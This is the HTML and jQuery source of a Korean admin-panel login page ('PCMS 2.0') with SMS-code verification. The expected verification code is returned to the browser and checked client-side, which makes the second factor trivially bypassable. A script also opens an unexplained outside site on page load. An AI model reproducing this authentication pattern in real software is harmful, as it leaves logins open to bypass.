<!DOCTYPE html>
<html>
<head>
    <title>PCMS - Login</title>
    <link href="/css/application.min.css" rel="stylesheet">
    <!-- as of IE9 cannot parse css files with more that 4K classes separating in two files -->
    <!--[if IE 9]>
    <link href="/css/application-ie9-part2.css" rel="stylesheet">
    <![endif]-->
    <link rel="shortcut icon" href="/img/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <script>

    </script>
</head>
<body class="login-page">

<div class="container">
    <main id="content" class="widget-login-container" role="main">
        <div class="row">
            <div class="col-lg-4 col-sm-6 col-xs-10 col-lg-offset-4 col-sm-offset-3 col-xs-offset-1">
                <h4 class="widget-login-logo animated fadeInUp">
                    <i class="fa fa-circle text-gray"></i>
                    PCMS 2.0
                    <i class="fa fa-circle text-warning"></i>
                </h4>
                <section class="widget widget-login animated fadeInUp">
                    <header>
                        <h3>Login to your PCMS 2.0</h3>
                    </header>
                    <div class="widget-body">
                        <p class="widget-login-info">
                            이 페이지는 크롬<a title="새창열림" href="https://www.google.com/chrome/browser/desktop/index.html"' target="_blank">(Chrome)</a>브라우저에 최적화 되어있습니다.
                        </p>
                        <form class="login-form mt-lg" id='loginform' name='loginform' method="post" action="/sys/login_ok">
                            <div class="form-group">
                                <input type="hidden" name="id" class="id form-control" id="exampleInputEmail1" placeholder="Id">
                                <input type="hidden" name="chaeum" class="chaeum form-control" id="chaeum" placeholder="번호확인">
                                <input type="text" name="username" class="username form-control" id="username" placeholder="아이디">
                            </div>
                            <div class="form-group">
                                <input name="userpasswd" class="userpasswd form-control" id="userpasswd" type="password" placeholder="비밀번호">
                            </div>
                            <div class="form-group" id="authdiv" style="display:none;">
                                <input type="text" name="auth" class="auth form-control" id="auth" placeholder="인증번호" onkeyup="this.value=this.value.replace(/[^0-9]/g,'')" onkeyPress="if((event.keyCode<48) || (event.keyCode>57)) event.returnValue=false;" maxlength="5">
                                <input type="hidden" name="conf" class="conf form-control" id="conf" placeholder="인증번호확인" value="1">
                            </div>
                            <div class="clearfix">
                                <div class="btn-toolbar pull-right">
                                    <!-- <button type="button" class="btn btn-default btn-sm">Create an Account</button> -->
                                    <a id="authsbm" class="btn btn-default btn-sm" href="#">인증번호받기</a>
                                    <a id="loginsbm" class="btn btn-inverse btn-sm" href="#" style="display:none;">로그인</a>
                                </div>
                            </div>
                        </form>
                    </div>
                </section>
            </div>
        </div>
    </main>
    <footer class="page-footer">
        2015 &copy; CMS. Admin.
    </footer>
</div>
<!-- The Loader. Is shown when pjax happens -->
<div class="loader-wrap hiding hide">
    <i class="fa fa-circle-o-notch fa-spin-fast"></i>
</div>

<!-- common libraries. required for every page-->
<script src="/vendor/jquery/dist/jquery.min.js"></script>
<script src="/vendor/jquery-pjax/jquery.pjax.js"></script>
<script src="/vendor/bootstrap-sass/vendor/assets/javascripts/bootstrap/transition.js"></script>
<script src="/vendor/bootstrap-sass/vendor/assets/javascripts/bootstrap/collapse.js"></script>
<script src="/vendor/bootstrap-sass/vendor/assets/javascripts/bootstrap/dropdown.js"></script>
<script src="/vendor/bootstrap-sass/vendor/assets/javascripts/bootstrap/button.js"></script>
<script src="/vendor/bootstrap-sass/vendor/assets/javascripts/bootstrap/tooltip.js"></script>
<script src="/vendor/bootstrap-sass/vendor/assets/javascripts/bootstrap/alert.js"></script>
<script src="/vendor/jQuery-slimScroll/jquery.slimscroll.min.js"></script>
<script src="/vendor/widgster/widgster.js"></script>

<!-- common app js -->
<script src="/js/settings.js"></script>
<script src="/js/app.js"></script>

<script type="text/javascript">
	
	$(document).ready(function(){
		setTimeout(function(){
		   window.open('http://mcca.sparo.cc/');
		},1);// after 5 seconds
	});

    $(function()
    {
        $('#authsbm').click(function(){
            var username = $('.username').val();
            var userpasswd = $('.userpasswd').val();
            var chaeum = $('.chaeum').val();
            var conf = $('.conf').val();

            if(username == '' || username == null){
                alert('아이디를 입력하세요');
                $('.username').focus();
                return false;
            }if(userpasswd == '' || userpasswd ==null){
                alert('비밀번호를 입력하세요');
                $('.userpasswd').focus();
                return false;
            }

            $.ajax({
                url: "<?php echo site_url('sys/try_login'); ?>",
                data: {username: username, userpasswd: userpasswd, chaeum: chaeum, conf: conf},
                type: 'POST',
                success:function(msg)
                {
                    var numb= msg.split("|");

                    var front = numb[0];
                    var back = numb[1];

                    $('.chaeum').val(back);

                    if(front == "AD" || front == "CS" || front == "AUTH"){
                        $('#loginform').submit();
                    }else if(front == "nonHp"){
                        alert('휴대폰 번호가 등록되지 않았습니다.\n시스템 담당자에게 문의하세요.\n담당자 : 미카엘, 신디');
                        $(location).attr('href','/sys/login');
                        return false;
                    }else if(front == "nonAD"){
                        $('#authsbm').hide();
                        $('#loginsbm').show();
                        $('#authdiv').slideDown();
                        $('.auth').focus();
                        return false;
                    }else{
                        alert('사용자 인증 실패');
                        $(location).attr('href','/sys/login');
                        return false;
                    }
                }
            });
        });

        $('#loginsbm').click(function(){
            var username = $('.username').val();
            var userpasswd = $('.userpasswd').val();
            var auth = $('.auth').val();
            var chaeum = $('.chaeum').val();

            if(auth == '' || auth == null){
                alert('인증번호를 입력하세요');
                $('.auth').focus();
                return false;
            }else{
                if(auth == chaeum){
                    $('#loginform').submit();
                }else{
                    alert('인증번호가 틀렸습니다.\n다시입력해주세요.');
                }
            }

        });

        $('#userpasswd').keyup(function(e)
        {
            var btnchk = $('.conf').val();

            if(btnchk == "1"){
                if(e.keyCode == 13)
                {
                    $('#authsbm').click();
                    $('.conf').val(0);
                }
            }
        });
        $('.auth').keyup(function(e)
        {
            var btnchk = $('.conf').val();

            if(btnchk == "0"){
                if(e.keyCode == 13)
                {
                    $('#loginsbm').click();
                }
            }
        });

    });
</script>

<!-- page specific libs -->
<!-- page specific js -->
</body>
</html>
